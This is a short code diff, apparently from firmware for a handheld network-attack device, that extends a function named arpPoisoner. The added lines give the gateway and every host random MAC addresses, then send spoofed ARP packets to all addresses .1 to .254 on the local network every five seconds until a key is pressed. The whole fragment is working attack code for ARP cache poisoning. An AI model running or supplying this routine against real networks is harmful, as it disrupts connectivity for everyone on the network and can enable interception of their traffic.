@@ -396,8 +396,14 @@ void arpPoisoner() {
 
   while(!checkAnyKeyPress()) {
     if(tmp+5000<millis()){  // sends frames every 5 seconds
+        for (int i = 0; i < 6; i++){
+          gatewayMAC[i] = random(256); // Create other random MAC to the Gateway
+        }
       for(int i=1;i<255;i++) {
         victimIP[3]=i;
+        for (int i = 0; i < 6; i++){
+          victimMAC[i] = random(256); // Create random MAC to all hosts
+        }
         // Sends random Gateway MAC to all devices in the network
         sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
            
